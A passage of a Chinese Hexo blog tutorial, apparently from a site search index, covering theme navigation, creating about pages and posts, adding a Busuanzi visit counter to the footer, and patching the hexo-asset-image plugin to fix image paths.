字段用来指定该页面是否显示评论。</p>\n<p>主题文件的_config.yml的nav添加个导航栏</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">category: /categories/</span><br></pre></td></tr></table></figure>\n<p>striptags：将html原文本缩略，并删除所有标记。</p>\n<p>先新建一个导航栏标签；在主题模板文件的_config.yml文件中设置</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">nav:</span><br><span class=\"line\">  home: /</span><br><span class=\"line\">  about: /about/</span><br></pre></td></tr></table></figure>\n<h2 id=\"创建about页面\"><a href=\"#创建about页面\" class=\"headerlink\" title=\"创建about页面\"></a>创建about页面</h2><p>新建一个about的页面</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo new page about</span><br></pre></td></tr></table></figure>\n<p>添加一些内容</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">title: about</span><br><span class=\"line\"><span class=\"built_in\">date</span>: 2023-04-29 21:49:29</span><br><span class=\"line\"><span class=\"built_in\">type</span>: about</span><br><span class=\"line\">---</span><br><span class=\"line\"><span class=\"comment\">### 单体应用存在的问题</span></span><br><span class=\"line\"></span><br><span class=\"line\">- 随着业务的发展，开发变得越来越复杂。</span><br><span class=\"line\">- 修改、新增某个功能，需要对整个系统进行测试、重新部署。</span><br></pre></td></tr></table></figure>\n<p><img src=\"OMQaMoHEHKbp9hWjVkGDr_ImQo-eqhnO_1Kz8eCaoio.png\" alt=\"image\"></p>\n<h2 id=\"新建文章\"><a href=\"#新建文章\" class=\"headerlink\" title=\"新建文章\"></a>新建文章</h2><p>方法1：</p>\n<p>定位到我们项目的根目</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo new <span class=\"string\">&#x27;my-first-blog&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>hexo会帮我们在“项目\\source\\_posts”下生成相关.md文件</p>\n<p><img src=\"I6B9MllFXPDmu5BESAms0VYvcirUV-Wp8QyPlquzN6U.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">title: my-first-blog</span><br><span class=\"line\"><span class=\"built_in\">date</span>: 2023-04-29 21:40:49</span><br><span class=\"line\">tags:</span><br><span class=\"line\">---</span><br></pre></td></tr></table></figure>\n<p>方法2：</p>\n<p>直接自己打开“项目\\source\\_posts”新建.md文件</p>\n<p>在书写的文章头添加上日期即可</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">title: Tags and Categories</span><br><span class=\"line\"><span class=\"built_in\">date</span>: 2017-12-24 23:29:53</span><br><span class=\"line\">tags:</span><br><span class=\"line\">- Foo</span><br><span class=\"line\">- Bar</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"BSXKfFqVvy9gbD0QiMuzv7Pr0zlOFyqPeRa51pvli0Y.png\" alt=\"image\"></p>\n<h2 id=\"博客访问量统计\"><a href=\"#博客访问量统计\" class=\"headerlink\" title=\"博客访问量统计\"></a>博客访问量统计</h2><p>进入.&#x2F;themes&#x2F;hexo-theme-cactus&#x2F;_config.yml添加下面一段代码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 是否开启访问量统计功能(不蒜子)</span></span><br><span class=\"line\">busuanzi:</span><br><span class=\"line\"> <span class=\"built_in\">enable</span>: <span class=\"literal\">true</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>进入.&#x2F;themes&#x2F;hexo-theme-cactus&#x2F;layout&#x2F;_partial&#x2F;footer.ejs将添加下面内容</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;footer <span class=\"built_in\">id</span>=<span class=\"string\">&quot;footer&quot;</span>&gt;</span><br><span class=\"line\">    &lt;div class=<span class=\"string\">&quot;footer-left&quot;</span>&gt;</span><br><span class=\"line\">        &lt;%= __(<span class=\"string\">&#x27;footer.copyright&#x27;</span>) %&gt; &amp;copy;</span><br><span class=\"line\">        &lt;% var endYear = (theme.copyright &amp;&amp; theme.copyright.end_year) ? theme.copyright.end_year : new Date().getFullYear() %&gt;</span><br><span class=\"line\">        &lt;% var startYear = (theme.copyright &amp;&amp; theme.copyright.start_year) ? theme.copyright.start_year : new Date().getFullYear() %&gt;</span><br><span class=\"line\">        &lt;%= startYear &gt;= endYear ? endYear : startYear + <span class=\"string\">&quot;-&quot;</span> + endYear %&gt;</span><br><span class=\"line\">        &lt;%= config.author || config.title %&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">    &lt;div class=<span class=\"string\">&quot;footer-right&quot;</span>&gt;</span><br><span class=\"line\">        &lt;nav&gt;</span><br><span class=\"line\">            &lt;ul&gt;</span><br><span class=\"line\">                &lt;% <span class=\"keyword\">for</span> (var i <span class=\"keyword\">in</span> theme.nav) &#123; %&gt;&lt;!--</span><br><span class=\"line\">       --&gt;&lt;li&gt;&lt;a href=<span class=\"string\">&quot;&lt;%- url_for(theme.nav[i]) %&gt;&quot;</span>&gt;&lt;%= __(<span class=\"string\">&#x27;nav.&#x27;</span>+i).replace(<span class=\"string\">&quot;nav.&quot;</span>, <span class=\"string\">&quot;&quot;</span>) %&gt;&lt;/a&gt;&lt;/li&gt;&lt;!--</span><br><span class=\"line\">     --&gt;&lt;% &#125; %&gt;</span><br><span class=\"line\">            &lt;/ul&gt;</span><br><span class=\"line\">            &lt;ul&gt;</span><br><span class=\"line\">                &lt;% <span class=\"keyword\">if</span> (theme.busuanzi &amp;&amp; theme.busuanzi.enable)&#123; %&gt;</span><br><span class=\"line\">                    &lt;!-- 不蒜子统计 --&gt;</span><br><span class=\"line\">                    &lt;span <span class=\"built_in\">id</span>=<span class=\"string\">&quot;busuanzi_container_site_pv&quot;</span>&gt;</span><br><span class=\"line\">                  本站总访问量&lt;span <span class=\"built_in\">id</span>=<span class=\"string\">&quot;busuanzi_value_site_pv&quot;</span>&gt;&lt;/span&gt;次</span><br><span class=\"line\">              &lt;/span&gt;</span><br><span class=\"line\">                    &lt;span class=<span class=\"string\">&quot;post-meta-divider&quot;</span>&gt;|&lt;/span&gt;</span><br><span class=\"line\">                    &lt;span <span class=\"built_in\">id</span>=<span class=\"string\">&quot;busuanzi_container_site_uv&quot;</span> style=<span class=\"string\">&#x27;display:none&#x27;</span>&gt;</span><br><span class=\"line\">                      本站访客数&lt;span <span class=\"built_in\">id</span>=<span class=\"string\">&quot;busuanzi_value_site_uv&quot;</span>&gt;&lt;/span&gt;人</span><br><span class=\"line\">              &lt;/span&gt;</span><br><span class=\"line\">                    &lt;script async src=<span class=\"string\">&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">                &lt;% &#125; %&gt;</span><br><span class=\"line\">            &lt;/ul&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;/nav&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">&lt;/footer&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"poHJNJtonbsgvvQIBG8E41KtD96hIIGt4BJFaA_zc_4.png\" alt=\"image\"></p>\n<p><img src=\"PsVIGJRySYSQSslwM2YnUpiuRKCqnZ1W7Ly_0xeAZLA.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;ul&gt;</span><br><span class=\"line\">                &lt;% <span class=\"keyword\">if</span> (theme.busuanzi &amp;&amp; theme.busuanzi.enable)&#123; %&gt;</span><br><span class=\"line\">                    &lt;!-- 不蒜子统计 --&gt;</span><br><span class=\"line\">                    &lt;span <span class=\"built_in\">id</span>=<span class=\"string\">&quot;busuanzi_container_site_pv&quot;</span>&gt;</span><br><span class=\"line\">                  本站总访问量&lt;span <span class=\"built_in\">id</span>=<span class=\"string\">&quot;busuanzi_value_site_pv&quot;</span>&gt;&lt;/span&gt;次</span><br><span class=\"line\">              &lt;/span&gt;</span><br><span class=\"line\">                    &lt;script async src=<span class=\"string\">&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">                &lt;% &#125; %&gt;</span><br><span class=\"line\">            &lt;/ul&gt;</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"文章添加图片\"><a href=\"#文章添加图片\" class=\"headerlink\" title=\"文章添加图片\"></a>文章添加图片</h2><h3 id=\"安装插件\"><a href=\"#安装插件\" class=\"headerlink\" title=\"安装插件\"></a>安装插件</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure>\n<h3 id=\"修改-config-yml\"><a href=\"#修改-config-yml\" class=\"headerlink\" title=\"修改_config.yml\"></a>修改_config.yml</h3><p>打开hexo的配置文件_config.yml；找到 post_asset_folder，把这个选项从false改成true</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#加载图片用到</span></span><br><span class=\"line\">post_asset_folder: <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"修改index-js\"><a href=\"#修改index-js\" class=\"headerlink\" title=\"修改index.js\"></a>修改index.js</h3><p>文件：</p>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">/node_modules/hexo-asset-image/index.js</span><br></pre></td></tr></table></figure>\n<p>修改内容1：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">58</span>行</span><br><span class=\"line\">$(<span class=\"variable language_\">this</span>).<span class=\"title function_\">attr</span>(<span class=\"string\">&#x27;src&#x27;</span>, config.<span class=\"property\">root</span> + link + src);</span><br><span class=\"line\">修改为：</span><br><span class=\"line\">$(<span class=\"variable language_\">this</span>).<span class=\"title function_\">attr</span>(<span class=\"string\">&#x27;src&#x27;</span>,src);</span><br></pre></td></tr></table></figure>\n<p>修改内容2：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">45</span>行</span><br><span class=\"line\">|| <span class=\"regexp\">/^\\s*\\/uploads|images\\//</span>.<span class=\"title function_\">test</span>(src))) &#123;</span><br><span class=\"line\">修改为：</span><br><span class=\"line\">|| <span class=\"regexp\">/^\\s*\\/uploads|images1\\//</span>.<span class=\"title function_\">test</span>(src))) &#123;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>最终代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&#x27;use strict&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> cheerio = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;cheerio&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-string</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">getPosition</span>(<span class=\"params\">str, m, i</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> str.<span class=\"title function_\">split</span>(m, i).<span class=\"title function_\">join</span>(m).<span class=\"property\">length</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">hexo.<span class=\"property\">extend</span>.<span class=\"property\">filter</span>.<span class=\"title function_\">register</span>(<span class=\"string\">&#x27;after_post_render&#x27;</span>, <span class=\"keyword\">function</span>(<span class=\"params\">data</span>)&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> config = hexo.<span class=\"property\">config</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(config.<span class=\"property\">post_asset_folder</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> link = data.<span class=\"property\">permalink</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> beginPos = <span class=\"title function_\">getPosition</span>(link, <span class=\"string\">&#x27;/&#x27;</span>, <span class=\"number\">3</span>) + <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> appendLink = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">    <span class=\"comment\">// In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;.../about/index.html&quot;.</span></span><br><span class=\"line\">    <span class=\"comment\">// if not with index.html endpos = link.lastIndexOf(&#x27;.&#x27;) + 1 support hexo-abbrlink</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"regexp\">/.*\\/index\\.html$/</span>.<span class=\"title function_\">test</span>(link)) &#123;</span><br><span class=\"line\">      <span class=\"comment\">// when permalink is end with index.html, for example 2019/02/20/xxtitle/index.html</span></span><br><span class=\"line\">      <span class=\"comment\">// image in xxtitle/ will go to xxtitle/index/</span></span><br><span class=\"line\">      appendLink = <span class=\"string\">&#x27;index/&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">var</span> endPos = link.<span class=\"title function_\">lastIndexOf</span>(<span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">var</span> endPos = link.<span class=\"title function_\">lastIndexOf</span>(<span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    link = link.<span class=\"title function_\">substring</span>(beginPos, endPos) + <span class=\"string\">&#x27;/&#x27;</span> + appendLink;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">var</span> toprocess = [<span class=\"string\">&#x27;excerpt&#x27;</span>, <span class=\"string\">&#x27;more&#x27;</span>, <span class=\"string\">&#x27;content&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; toprocess.<span class=\"property\">length</span>; i++)&#123;</span><br><span class=\"line\">      <span class=\"keyword\">var</span> key = toprocess[i];</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">var</span> $ = cheerio.<span class=\"title function_\">load</span>(data[key], &#123;</span><br><span class=\"line\">        <span class=\"attr\">ignoreWhitespace</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">        <span class=\"attr\">xmlMode</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">        <span class=\"attr\">lowerCaseTags</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">        <span class=\"attr\">decodeEntities</span>: <span class=\"literal\">false</span></span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">      $(<span class=\"string\">&#x27;img&#x27;</span>).<span class=\"title function_\">each</span>(<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($(<span class=\"variable language_\">this</span>).<span class=\"title function_\">attr</span>(<span class=\"string\">&#x27;src&#x27;</span>))&#123;</span><br><span class=\"line\">          <span class=\"comment\">// For windows style path, we replace &#x27;\\&#x27; to &#x27;/&#x27;.</span></span><br><span class=\"line\">          <span class=\"keyword\">var</span> src = $(<span class=\"variable language_\">this</span>).<span class=\"title function_\">attr</span>(<span class=\"string\">&#x27;src&#x27;</span>).<span class=\"title function_\">replace</span>(<span class=\"string\">&#x27;\\\\&#x27;</span>, <span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">if</span>(!(<span class=\"regexp\">/http[s]*.*|\\/\\/.*/</span>.<span class=\"title function_\">test</span>(src)</span><br><span class=\"line\">            || <span class=\"regexp\">/^\\s+\\//</span>.<span class=\"title function_\">test</span>(src)</span><br><span class=\"line\">            || <span class=\"regexp\">/^\\s*\\/uploads|images1\\//</span>.<span class=\"title function_\">test</span>(src))) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// For &quot;about&quot; page, the first part of &quot;src&quot; can&#x27;t be removed.</span></span><br><span class=\"line\">            <span class=\"comment\">// In addition, to support multi-level local directory.</span></span><br><span class=\"line\">            <span class=\"keyword\">var</span> linkArray = link.<span class=\"title function_\">split</span>(<span class=\"string\">&#x27;/&#x27;</span>).<span class=\"title function_\">filter</span>(<span class=\"keyword\">function</span>(<span class=\"params\">elem</span>)&#123;</span><br><span class=\"line\">              <span class=\"keyword\">return</span> elem != <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">            <span class=\"keyword\">var</span> srcArray = src.<span class=\"title function_\">split</span>(<span class=\"string\">&#x27;/&#x27;</span>).<span class=\"title function_\">filter</span>(<span class=\"keyword\">function</span>(<span class=\"params\">elem</span>)&#123;</span><br><span class=\"line\">              <span class=\"keyword\">return</span> elem != <span class=\"string\">&#x27;&#x27;</span> &amp;&amp; elem != <span class=\"string\">&#x27;.&#x27;</span>;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(srcArray.<span class=\"property\">length</span> &gt; <span class=\"number\">1</span>)</span><br><span class=\"line\">            srcArray.<span class=\"title function_\">shift</span>();</span><br><span class=\"line\">            src = srcArray.<span class=\"title function_\">join</span>(<span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//$(this).attr(&#x27;src&#x27;, config.root + link + src);</span></span><br><span class=\"line\">            $(<span class=\"variable language_\">this</span>).<span class=\"title function_\">attr</span>(<span class=\"string\">&#x27;src&#x27;</span>, src);</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">info</span>(<span class=\"string\">&quot;src：&quot;</span> + src);<span class=\"comment\">//src：Fp7aKq--0PJJ6yD8kdJ6bU6csSL8UPnWsCQKPjaGIv0.png</span></span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"property\">info</span>&amp;&amp;<span class=\"variable language_\">console</span>.<span class=\"title function_\">info</span>(<span class=\"string\">&quot;update link as:--&gt;&quot;</span>+config.<span class=\"property\">root</span> + link + src);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">          <span class=\"variable language_\">console</span>.<span class=\"property\">info</span>&amp;&amp;<span class=\"variable language_\">console</span>.<span class=\"title function_\">info</span>(<span class=\"string\">&quot;no src attr, skipped...&quot;</span>);</span><br><span class=\"line\">          <span class=\"variable language_\">console</span>.<span class=\"property\">info</span>&amp;&amp;<span class=\"variable language_\">console</span>.<span class=\"title function_\">info</span>($(<span class=\"variable language_\">this</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">      data[key] = $.<span class=\"title function_\">html</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n","categories":["Hexo"],"tags":["Hexo"]}]